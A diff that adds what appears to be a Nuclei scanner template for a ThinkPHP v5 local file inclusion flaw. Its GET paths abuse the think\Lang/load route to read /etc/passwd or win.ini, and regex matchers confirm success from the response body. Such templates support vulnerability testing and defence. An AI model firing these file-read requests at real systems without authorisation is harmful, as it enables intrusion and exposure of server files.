@@ -1,0 +1,30 @@
+id: poc-local-thinkphp-v5-think-Lang-load-file-inlclude
+
+info:
+  name: poc-local-thinkphp-v5-think-Lang-load-file-inlclude
+  author: capiton
+  severity: high
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?s=index/\think\Lang/load&file=/etc/passwd'
+      - '{{BaseURL}}/?s=index/\think\Lang/load&file=C:\windows\win.ini'
+      - '{{BaseURL}}/public/index.php?s=index/\think\Lang/load&file=/etc/passwd'
+      - '{{BaseURL}}/public/index.php?s=index/\think\Lang/load&file=C:\windows\win.ini'
+      - '{{BaseURL}}/?s=\think\Lang/load&file=/etc/passwd'
+      - '{{BaseURL}}/?s=\think\Lang/load&file=C:\windows\win.ini'
+    
+    
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+        part: body
